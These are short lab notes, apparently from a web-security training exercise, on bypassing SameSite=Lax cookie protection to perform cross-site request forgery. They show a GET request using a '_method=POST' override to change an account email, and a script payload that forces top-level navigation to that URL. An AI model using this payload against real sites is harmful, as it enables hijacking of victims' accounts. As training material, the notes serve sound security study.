we have noticed that we can change the email using a GET instead of using a POST, with the method override.

GET /my-account/change-email?email=wiener443%40normal-user.net&_method=POST  so this works and allows us to change the email


Now the default policy here for SameSite is LAX, this means that we can perform a request if the it starts from the same site or if it is performed on top-level navigation, for example when we input the url in the url bar in browsers

A way to force a top level navigation can be using document.location, so we can provide this script:

<script>
    document.location = "https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email?email=pwned@web-security-academy.net&_method=POST";
</script>



for top-level navigation we can use also window.location.href = 'https://www.example.com/newpage';
location.assign('https://www.example.com/newpage');
window.open('https://www.example.com/newpage', '_blank');
